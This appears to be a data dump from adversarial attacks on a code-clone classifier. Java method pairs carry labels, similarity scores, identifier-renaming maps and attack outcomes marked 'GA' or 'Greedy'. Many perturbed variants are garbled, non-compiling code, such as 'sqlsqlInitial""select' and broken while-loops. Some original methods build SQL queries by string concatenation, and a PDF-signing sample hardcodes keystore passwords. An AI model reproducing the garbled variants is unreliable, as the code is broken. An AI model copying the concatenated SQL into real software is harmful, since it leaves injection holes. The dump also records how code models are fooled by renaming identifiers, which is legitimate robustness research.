",68,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,in,out,source,destination",,,,0,,0,GA,1875,0.6590063492457072,failed,[]
156,"    public void update(String channelPath, String dataField, String fatherDocId) {
        String sqlInitial = ""select uri from t_ip_doc_res where doc_id = '"" + fatherDocId + ""' and type="" + "" '"" + ces.platform.infoplat.core.DocResource.DOC_MAGAZINE_TYPE + ""' "";
        String sqlsortURL = ""update t_ip_doc_res set uri = ? where doc_id = '"" + fatherDocId + ""' "" + "" and type = '"" + ces.platform.infoplat.core.DocResource.DOC_MAGAZINE_TYPE + ""' "";
        Connection conn = null;
        ResultSet rs = null;
        PreparedStatement ps = null;
        try {
            dbo = (ERDBOperation) createDBOperation();
            String url = """";
            boolean flag = true;
            StringTokenizer st = null;
            conn = dbo.getConnection();
            conn.setAutoCommit(false);
            ps = conn.prepareStatement(sqlInitial);
            rs = ps.executeQuery();
            if (rs.next()) url = rs.getString(1);
            if (!url.equals("""")) {
                st = new StringTokenizer(url, "","");
                String sortDocId = """";
                while (st.hasMoreTokens()) {
                    if (flag) {
                        sortDocId = ""'"" + st.nextToken() + ""'"";
                        flag = false;
                    } else {
                        sortDocId = sortDocId + "","" + ""'"" + st.nextToken() + ""'"";
                    }
                }
                String sqlsort = ""select id from t_ip_doc where id in ("" + sortDocId + "") order by "" + dataField;
                ps = conn.prepareStatement(sqlsort);
                rs = ps.executeQuery();
                String sortURL = """";
                boolean sortflag = true;
                while (rs.next()) {
                    if (sortflag) {
                        sortURL = rs.getString(1);
                        sortflag = false;
                    } else {
                        sortURL = sortURL + "","" + rs.getString(1);
                    }
                }
                ps = conn.prepareStatement(sqlsortURL);
                ps.setString(1, sortURL);
                ps.executeUpdate();
            }
            conn.commit();
        } catch (Exception e) {
            e.printStackTrace();
            try {
                conn.rollback();
            } catch (SQLException e1) {
                e1.printStackTrace();
            }
        } finally {
            close(rs, null, ps, conn, dbo);
        }
    }
 <SPLIT>     public static void copyFileChannel(File src, File dst, boolean preserveModificationTime) throws IOException {
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        long length = 0;
        try {
            inputChannel = new FileInputStream(src).getChannel();
            length = inputChannel.size();
            outputChannel = new FileOutputStream(dst).getChannel();
            long total = 0;
            while (total < length) {
                total += inputChannel.transferTo(0, length, outputChannel);
            }
            if (preserveModificationTime) {
                dst.setLastModified(src.lastModified());
            }
        } finally {
            if (inputChannel != null) {
                inputChannel.close();
            }
            if (outputChannel != null) {
                outputChannel.close();
            }
        }
    }
",437,"    public void write(String fileObject, String  dataTable, String fatherFileName) {
        String sqlsqlInitial""select uri from t_ip_doc_res where doc_id = '"" + fatherFileName + ""' and type="" + "" '"" + ces.platform.infoplat.core.DocResource.DOC_MAGAZINE_TYPE + ""' "";
        String sqlsqllortUrl""update t_ip_doc_res set uri = ? where doc_id = '"" + fatherFileName + ""' "" + "" and type = '"" + ces.platform.infoplat.core.DocResource.DOC_MAGAZINE_TYPE + ""' "";
        Connection sync = null;
        ResultSet rx = null;
        PreparedStatement os = null;
        try {
            dbc = (ERDBOperation) createDBOperation();
            String rule = """";
            boolean match = true;
            StringTokenizer std = null;
            sync = dbc.getConnection();
            sync.setAutoCommit(false);
            os = sync.prepareStatement(sqlInitial);
            rx = os.executeQuery();
            if (rx.next()) rule = rx.getString(1);
            if (!rule.equals("""")) {
                sstd= new StringTokenizer(rule, "","");
                String  sortFilePath = """";
                while (std.hasMoreTokens()) {
                    if (match) {
                        s sortFilePath= ""'"" + std.nextToken() + ""'"";
                        match = false;
                    } else {
                        s sortFilePath= s sortFilePath+ "","" + ""'"" + std.nextToken() + ""'"";
                    }
                }
                String sqlsosqsortelect id from t_ip_doc where id in ("" + s sortFilePath+ "") order by "" +  dataTable;
                os = sync.prepareStatement(sqsort);
                rx = os.executeQuery();
                String  sortURI = """";
                boolean Sortflag = true;
                while (rx.next()) {
                    if (Sortflag) {
                         sortURI = rx.getString(1);
                        Sortflag = false;
                    } else {
                         sortURI =  sortURI + "","" + rx.getString(1);
                    }
                }
                os = sync.prepareStatement(sqllortUrl);
                os.setString(1,  sortURI);
                os.executeUpdate();
            }
            sync.commit();
        } catch (Exception e) {
            e.printStackTrace();
            try {
                sync.rollback();
            } catch (SQLException e1) {
                e1.printStackTrace();
            }
        } finally {
            close(rx, null, os, sync, dbc);
        }
    }
",LABEL_0,LABEL_0,0.5255818963050842,1,"update,channelPath,dataField,fatherDocId,sqlInitial,sqlsortURL,conn,rs,ps,dbo,url,st,sortDocId,flag,sqlsort,sortURL,sortflag",,,,2,"update:write,channelPath:fileObject,dataField: dataTable,fatherDocId:fatherFileName,sqlInitial:sqlInitial,sqlsortURL:sqllortUrl,conn:sync,rs:rx,ps:os,dbo:dbc,url:rule,st:std,sortDocId: sortFilePath,flag:match,sqlsort:sqsort,sortURL: sortURI,sortflag:Sortflag,",1,GA,4578,1.7391404906908672,ga,[]
157,"    public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
 <SPLIT>     public void init(ServletContext context) throws ScratchException {
        try {
            log.debug(""Attempting to load Controllers from file: "" + REGISTRY_FILENAME);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Enumeration<URL> urls = classLoader.getResources(REGISTRY_FILENAME);
            while (urls.hasMoreElements()) {
                URL url = urls.nextElement();
                log.debug(""Found: "" + url);
                BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
                String className = null;
                while ((className = reader.readLine()) != null) {
                    className = className.trim();
                    if (!"""".equals(className) && !className.startsWith(""#"")) {
                        log.debug(""Found class: "" + className);
                        Class<?> clazz = classLoader.loadClass(className);
                        addClass(clazz);
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
            log.error(e);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            log.error(e);
        }
    }
",765,,LABEL_0,LABEL_1,,-4,"convert,src,dest,in,p,ds,format,hasPixelData,inflate,pxlen,out",,,,0,,0,Greedy,1,0.0008634765942891439,,[]
158,"    public static String hash(String text) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = MessageDigest.getInstance(""SHA-1"");
        byte[] sha1hash = new byte[40];
        md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        sha1hash = md.digest();
        return SHA1.convertToHex(sha1hash);
    }
 <SPLIT>     public static String createPseudoUUID() {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(""MD5"");
            messageDigest.update(new UID().toString().getBytes());
            try {
                String localHost = InetAddress.getLocalHost().toString();
                messageDigest.update(localHost.getBytes());
            } catch (UnknownHostException e) {
                throw new OXFException(e);
            }
            byte[] digestBytes = messageDigest.digest();
            StringBuffer sb = new StringBuffer();
            sb.append(toHexString(NumberUtils.readIntBigEndian(digestBytes, 0)));
            sb.append('-');
            sb.append(toHexString(NumberUtils.readShortBigEndian(digestBytes, 4)));
            sb.append('-');
            sb.append(toHexString(NumberUtils.readShortBigEndian(digestBytes, 6)));
            sb.append('-');
            sb.append(toHexString(NumberUtils.readShortBigEndian(digestBytes, 8)));
            sb.append('-');
            sb.append(toHexString(NumberUtils.readShortBigEndian(digestBytes, 10)));
            sb.append(toHexString(NumberUtils.readIntBigEndian(digestBytes, 12)));
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new OXFException(e);
        }
    }
",77,,LABEL_1,LABEL_1,LABEL_1,-1,"hash,text,UnsupportedEncodingException,md,sha1hash",,,,0,,0,GA,1813,0.6490470846494039,failed,[]
159,"    public static boolean decodeFileToFile(final String infile, final String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            final byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (final java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (final Exception exc) {
            }
            try {
                out.close();
            } catch (final Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",200,"    public static boolean decodeFiletoFiles(final String infiles, final String infolder) {
        boolean fail = false;
        java.io.InputStream din = null;
        java.io.OutputStream obj = null;
        try {
            idin= new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infiles)), Base64.DECODE);
            oobj= new java.io.BufferedOutputStream(new java.io.FileOutputStream(infolder));
            final byte[] url = new byte[65536];
            int  connect = -1;
            while  connectad = d connectead(url)) >= 0) {
                obj.write(url, 0,  connect);
            }
            fail = true;
        } catch (final java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                din.close();
            } catch (final Exception exc) {
            }
            try {
                obj.close();
            } catch (final Exception exc) {
            }
        }
        return fail;
    }
",LABEL_1,LABEL_1,0.5381656885147095,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,0,"decodeFileToFile:decodeFiletoFiles,infile:infiles,outfile:infolder,in:din,out:obj,buffer:url,read: connect,success:fail,",0,GA,696,0.25323150952657064,ga,[]
160,"    public static boolean decodeFileToFile(final String infile, final String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            final byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (final java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (final Exception exc) {
            }
            try {
                out.close();
            } catch (final Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public static void makeBackup(File dir, String sourcedir, String destinationdir, String destinationDirEnding) {
        String[] files;
        files = dir.list();
        File checkdir = new File(destinationdir + System.getProperty(""file.separator"") + destinationDirEnding);
        if (!checkdir.isDirectory()) {
            checkdir.mkdir();
        }
        ;
        Date date = new Date();
        long msec = date.getTime();
        checkdir.setLastModified(msec);
        File checkFile = new File(checkdir + System.getProperty(""file.separator"") + ""azureus.config"");
        if (checkFile.exists()) {
            checkFile.setLastModified(msec);
        }
        try {
            for (int i = 0; i < files.length; i++) {
                File f = new File(dir, files[i]);
                File g = new File(files[i]);
                if (f.isDirectory()) {
                } else {
                    String destinationFile = checkdir + System.getProperty(""file.separator"") + g;
                    String sourceFile = sourcedir + System.getProperty(""file.separator"") + g;
                    FileInputStream infile = new FileInputStream(sourceFile);
                    FileOutputStream outfile = new FileOutputStream(destinationFile);
                    int c;
                    while ((c = infile.read()) != -1) outfile.write(c);
                    infile.close();
                    outfile.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",200,"    public static boolean decodeFileToFile(final String infile, final String Outfull) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream work = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            work = new java.io.BufferedOutputStream(new java.io.FileOutputStream(Outfull));
            final byte[] url = new byte[65536];
            int  ride = -1;
            while rideead =  rideead(url)) >= 0) {
                work.write(url, 0,  ride);
            }
            success = true;
        } catch (final java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (final Exception exc) {
            }
            try {
                work.close();
            } catch (final Exception exc) {
            }
        }
        return success;
    }
",LABEL_1,LABEL_1,0.9519347548484802,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,10,"decodeFileToFile:decodeFileToFile,infile:infile,outfile:Outfull,in:in,out:work,buffer:url,read: ride,success:success,",4,GA,404,0.14941126902898152,ga,[]
161,"    public static String getFile(String serviceName, String wsdlLocation, String endpoint) throws AxisFault {
        mLog.debug(""Downloading WSDL file from: "" + wsdlLocation);
        mLog.debug(""Received endpoint: "" + endpoint);
        String fileLocation = null;
        try {
            String tempDir = System.getProperty(""java.io.tmpdir"");
            URL url = new URL(wsdlLocation);
            String WSDLFile = tempDir + File.separator + serviceName + "".wsdl"";
            String tmpWSDLFile = WSDLFile + "".tmp"";
            File inputFile = new File(WSDLFile);
            File tmpFile = new File(tmpWSDLFile);
            if (!inputFile.exists() || inputFile.length() == 0) {
                mLog.debug(""Downloading the WSDL"");
                inputFile.createNewFile();
                InputStream in = url.openStream();
                FileOutputStream out = new FileOutputStream(inputFile);
                URLConnection con = url.openConnection();
                int fileLength = con.getContentLength();
                ReadableByteChannel channelIn = Channels.newChannel(in);
                FileChannel channelOut = out.getChannel();
                channelOut.transferFrom(channelIn, 0, fileLength);
                channelIn.close();
                channelOut.close();
                out.flush();
                out.close();
                in.close();
                Document tmpDocument = XMLUtils.newDocument(new FileInputStream(inputFile));
                NodeList nl1 = tmpDocument.getElementsByTagName(""wsdlsoap:address"");
                for (int i = 0; i < nl1.getLength(); i++) {
                    Node node1 = nl1.item(i);
                    if (node1.getNodeName().equals(""wsdlsoap:address"")) {
                        ((Element) node1).setAttribute(""location"", endpoint);
                    }
                }
                FileOutputStream tmpOut = new FileOutputStream(tmpFile);
                XMLUtils.DocumentToStream(tmpDocument, tmpOut);
                tmpOut.flush();
                tmpOut.close();
                boolean retVal = inputFile.delete();
                if (retVal) {
                    retVal = tmpFile.renameTo(new File(WSDLFile));
                }
                mLog.debug(""Return Value: "" + retVal);
            } else {
                mLog.debug(""The WSDL is already at the ServiceProvider"");
            }
            fileLocation = WSDLFile;
        } catch (MalformedURLException mx) {
            mLog.error(""MalformedURLException: "" + mx.getMessage() + "", cause: "" + mx.getCause().getMessage());
            throw new AxisFault(mx.getMessage(), mx.getCause());
        } catch (IOException ix) {
            mLog.error(""IOException: "" + ix.getMessage() + "", cause: "" + ix.getCause().getMessage());
            throw new AxisFault(ix.getMessage(), ix.getCause());
        } catch (ParserConfigurationException px) {
            mLog.error(""ParserConfigurationException: "" + px.getMessage() + "", cause: "" + px.getCause().getMessage());
            throw new AxisFault(px.getMessage(), px.getCause());
        } catch (SAXException sx) {
            mLog.error(""SAXException: "" + sx.getMessage() + "", cause: "" + sx.getCause().getMessage());
            throw new AxisFault(sx.getMessage(), sx.getCause());
        }
        return fileLocation;
    }
 <SPLIT>     public static void main(String[] args) {
        String source, destination;
        if (args[0].toLowerCase().endsWith("".gz"")) {
            source = args[0];
            destination = source.substring(0, source.length() - 3);
        } else {
            source = args[0] + "".gz"";
            destination = args[0];
        }
        InputStream is = null;
        OutputStream os = null;
        try {
            is = new GZIPInputStream(new FileInputStream(source));
            os = new FileOutputStream(destination);
            byte[] buffer = new byte[8192];
            for (int length; (length = is.read(buffer)) != -1; ) os.write(buffer, 0, length);
        } catch (IOException e) {
            System.err.println(""Fehler: Kann nicht entpacken "" + args[0]);
        } finally {
            if (os != null) try {
                os.close();
            } catch (IOException e) {
            }
            if (is != null) try {
                is.close();
            } catch (IOException e) {
            }
        }
    }
",631,,LABEL_1,LABEL_0,,-4,"getFile,serviceName,wsdlLocation,endpoint,fileLocation,tempDir,url,WSDLFile,tmpWSDLFile,inputFile,tmpFile,in,out,con,fileLength,channelIn,channelOut,tmpDocument,nl1,i,node1,tmpOut,retVal",,,,0,,0,Greedy,1,0.0007804552714029948,,[]
162,"    public static void fileDownload(String fAddress, String destinationDir) {
        int slashIndex = fAddress.lastIndexOf('/');
        int periodIndex = fAddress.lastIndexOf('.');
        String fileName = fAddress.substring(slashIndex + 1);
        URL url;
        try {
            url = new URL(fAddress);
            URLConnection uc = url.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(uc.getInputStream()));
            File file = new File(destinationDir + ""/download.pdf"");
            FileOutputStream fos = new FileOutputStream(file);
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(fos));
            int inputLine;
            while ((inputLine = in.read()) != -1) out.write(inputLine);
            in.close();
        } catch (Exception ex) {
            Logger.getLogger(UrlDownload.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
 <SPLIT>     public String readReferenceText(final String ident) throws NoContentException {
        try {
            String name = getFilename(ident);
            URL url = new URL(FreqAnalysisPlugin.getDefault().getBundle().getEntry(""/""), name);
            InputStream in = url.openStream();
            InputStreamReader isr = new InputStreamReader(in, ""UTF-8"");
            BufferedReader br = new BufferedReader(isr);
            StringBuffer buffer = new StringBuffer();
            String line = br.readLine();
            while (null != line) {
                buffer.append(line + ""\n"");
                line = br.readLine();
            }
            return buffer.toString();
        } catch (MalformedURLException muEx) {
            logError(muEx);
        } catch (UnsupportedEncodingException ueEx) {
            logError(ueEx);
        } catch (IOException ioEx) {
            logError(ioEx);
        }
        throw new NoContentException(""Unable to find or read reference text."");
    }
",183,,LABEL_1,LABEL_0,,-4,"fileDownload,fAddress,destinationDir,slashIndex,periodIndex,fileName,url,uc,in,file,fos,out,inputLine",,,,0,,0,Greedy,1,0.0005447983741760254,,[]
163,"    public void run(String[] args) throws Throwable {
        FileInputStream input = new FileInputStream(args[0]);
        FileOutputStream output = new FileOutputStream(args[0] + "".out"");
        Reader reader = $(Reader.class, $declass(input));
        Writer writer = $(Writer.class, $declass(output));
        Pump pump;
        if (args.length > 1 && ""diag"".equals(args[1])) {
            pump = $(new Reader() {

                int counter;

                @ToContext(mode = InvocationMode.sideEffect)
                public int read(byte[] buffer, int off, int len) throws Exception {
                    Integer rd = (Integer) $next();
                    if (rd > 0) {
                        counter += rd;
                    }
                    return 0;
                }

                @ToContext(mode = InvocationMode.sideEffect)
                public void close() throws Exception {
                    System.out.println(""Read from input "" + counter + "" bytes."");
                }
            }, reader, writer, new Writer() {

                int counter;

                @ToContext(mode = InvocationMode.sideEffect)
                public void write(byte[] buffer, int off, int len) throws Exception {
                    counter += len;
                }

                @ToContext(mode = InvocationMode.sideEffect)
                public void close() throws Exception {
                    System.out.println(""Written to output "" + counter + "" bytes."");
                }
            });
        } else {
            pump = $(reader, writer);
        }
        pump.pump();
    }
 <SPLIT>     public void uncaughtException(final Thread t, final Throwable e) {
        final Display display = Display.getCurrent();
        final Shell shell = new Shell(display);
        final MessageBox message = new MessageBox(shell, SWT.OK | SWT.CANCEL | SWT.ICON_ERROR);
        message.setText(""Hawkscope Error"");
        message.setMessage(e.getMessage() + ""\nSubmit Hawkscope Error Report to Issue Tracker?"");
        log.error(""Uncaught exception"", e);
        if (message.open() == SWT.OK) {
            IOUtils.copyToClipboard(Version.getBugReport(e));
            try {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry?comment="" + URLEncoder.encode(""Please paste the Hawkscope Error "" + ""Report here. It's currently copied to your "" + ""clipboard. Thank you for your support!"", Constants.ENCODING));
            } catch (final Exception e1) {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry"");
            }
        }
        shell.dispose();
    }
",299,"    public void start(String[] args) throws Throwable {
        FileInputStream active = new FileInputStream(args[0]);
        FileOutputStream control = new FileOutputStream(args[0] + "".out"");
        Reader rreader= $(Reader.class, $declass(active));
        Writer wconnection= $(Writer.class, $declass(control));
        Pump pumps;
        if (args.length > 1 && ""diag"".equals(args[1])) {
            pumps = $(new Reader() {

                int url;

                @ToContext(mode = InvocationMode.sideEffect)
                public int read(byte[] document, int out, int body) throws Exception {
                    Integer rd = (Integer) $next();
                    if (rd > 0) {
                        url += rd;
                    }
                    return 0;
                }

                @ToContext(mode = InvocationMode.sideEffect)
                public void close() throws Exception {
                    System.out.println(""Read from input "" + url + "" bytes."");
                }
            }, reader, connection, new Writer() {

                int url;

                @ToContext(mode = InvocationMode.sideEffect)
                public void write(byte[] document, int out, int body) throws Exception {
                    url += body;
                }

                @ToContext(mode = InvocationMode.sideEffect)
                public void close() throws Exception {
                    System.out.println(""Written to output "" + url + "" bytes."");
                }
            });
        } else {
            pumppumps(reader, connection);
        }
        pumps.pumps();
    }
",LABEL_1,LABEL_1,0.6735659241676331,1,"run,input,output,reader,writer,pump,counter,buffer,off,len,rd",,,,6,"run:start,input:active,output:control,reader:reader,writer:connection,pump:pumps,counter:url,buffer:document,off:out,len:body,rd:rd,",2,GA,1247,0.4636947512626648,ga,[]
164,"    public static void main(String[] args) {
        System.out.println(""Chapter 16: example SignedPdf"");
        System.out.println(""-> Creates a signed PDF;"");
        System.out.println(""-> jars needed: iText.jar"");
        System.out.println(""-> files generated in /results subdirectory:"");
        System.out.println(""   Resource needed: .keystore"");
        System.out.println(""-> Resulting PDFs: unsigned_message.pdf, signed_message.pdf,"");
        System.out.println(""   corrupted_message.pdf, signed_message_invisible.pdf,"");
        System.out.println(""   double_signed_message.pdf, revision_1.pdf and revision_2.pdf"");
        createPdf();
        PdfReader reader;
        try {
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            reader = new PdfReader(""results/in_action/chapter16/unsigned_message.pdf"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/signed_message.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0');
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setCertificationLevel(PdfSignatureAppearance.CERTIFIED_FORM_FILLING);
            appearance.setReason(""It's personal."");
            appearance.setLocation(""Foobar"");
            appearance.setVisibleSignature(new Rectangle(30, 750, 500, 565), 1, null);
            stamper.close();
        } catch (KeyStoreException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (CertificateException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (UnrecoverableKeyException e) {
            e.printStackTrace();
        } catch (DocumentException e) {
            e.printStackTrace();
        }
        try {
            reader = new PdfReader(""results/in_action/chapter16/signed_message.pdf"");
            Document document = new Document(reader.getPageSizeWithRotation(1));
            PdfCopy copy = new PdfCopy(document, new FileOutputStream(""results/in_action/chapter16/corrupted_message.pdf""));
            document.open();
            copy.addPage(copy.getImportedPage(reader, 1));
            document.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
        } catch (DocumentException de) {
            de.printStackTrace();
        }
        try {
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            reader = new PdfReader(""results/in_action/chapter16/unsigned_message.pdf"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/signed_message_invisible.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0');
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setReason(""It's personal."");
            appearance.setLocation(""Foobar"");
            stamper.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            reader = new PdfReader(""results/in_action/chapter16/signed_message.pdf"");
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/double_signed_message.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0', null, true);
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setReason(""Double signed."");
            appearance.setLocation(""Foobar"");
            appearance.setVisibleSignature(new Rectangle(300, 750, 500, 800), 1, ""secondsig"");
            stamper.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            CertificateFactory cf = CertificateFactory.getInstance(""X509"");
            Collection col = cf.generateCertificates(new FileInputStream(""resources/in_action/chapter16/foobar.cer""));
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(null, null);
            for (Iterator it = col.iterator(); it.hasNext(); ) {
                X509Certificate cert = (X509Certificate) it.next();
                System.out.println(cert.getIssuerDN().getName());
                ks.setCertificateEntry(cert.getSerialNumber().toString(Character.MAX_RADIX), cert);
            }
            reader = new PdfReader(""results/in_action/chapter16/double_signed_message.pdf"");
            AcroFields af = reader.getAcroFields();
            ArrayList names = af.getSignatureNames();
            String name;
            for (Iterator it = names.iterator(); it.hasNext(); ) {
                name = (String) it.next();
                System.out.println(""Signature name: "" + name);
                System.out.println(""Signature covers whole document: "" + af.signatureCoversWholeDocument(name));
                System.out.println(""Document revision: "" + af.getRevision(name) + "" of "" + af.getTotalRevisions());
                FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/revision_"" + af.getRevision(name) + "".pdf"");
                byte bb[] = new byte[8192];
                InputStream ip = af.extractRevision(name);
                int n = 0;
                while ((n = ip.read(bb)) > 0) os.write(bb, 0, n);
                os.close();
                ip.close();
                PdfPKCS7 pk = af.verifySignature(name);
                Calendar cal = pk.getSignDate();
                Certificate pkc[] = pk.getCertificates();
                System.out.println(""Subject: "" + PdfPKCS7.getSubjectFields(pk.getSigningCertificate()));
                System.out.println(""Document modified: "" + !pk.verify());
                Object fails[] = PdfPKCS7.verifyCertificates(pkc, ks, null, cal);
                if (fails == null) System.out.println(""Certificates verified against the KeyStore""); else System.out.println(""Certificate failed: "" + fails[1]);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     public static void fileCopy(String from_name, String to_name) throws IOException {
        File fromFile = new File(from_name);
        File toFile = new File(to_name);
        if (fromFile.equals(toFile)) abort(""cannot copy on itself: "" + from_name);
        if (!fromFile.exists()) abort(""no such currentSourcepartName file: "" + from_name);
